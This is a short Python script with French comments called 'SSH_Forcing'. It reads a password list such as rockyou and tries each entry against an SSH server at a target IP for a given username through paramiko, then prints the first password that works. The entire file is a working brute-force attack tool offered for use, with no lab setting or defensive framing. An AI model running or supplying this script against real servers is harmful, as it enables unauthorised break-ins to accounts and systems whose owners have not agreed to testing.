# adresse ip de la cible
# la liste de mot en utf-8
# Pour convertir en utf8 : iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > /usr/share/wordlists/rockyou_utf8.txt

import sys
import pyfiglet
import os
import paramiko


def ssh_connect(target,username,password,state=0):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target,username=username, password=password)
    except paramiko.AuthenticationException:
        state = 1
    client.close()
    return state

def brute_force(target,wordlist,username):
    with open(wordlist,'r') as file:
        for passwd in file.readlines():
                result= ssh_connect(target,username,passwd.strip())
                if result == 0:
                    password = passwd
                    file.close()
                    return password
                
banner = pyfiglet.figlet_format("SSH_Forcing")
print(banner)

try:
    target = sys.argv[1]
    wordlist = sys.argv[2]
    
    print("Saissisez le username de la cible")
    username = input()
    print("chargement...")
    password = brute_force(target,wordlist,username)
    print("Le mot de passe est {}".format(password))
            
except IndexError:
    print("Vous devez saisir l'adresse ip de la cible et une liste")
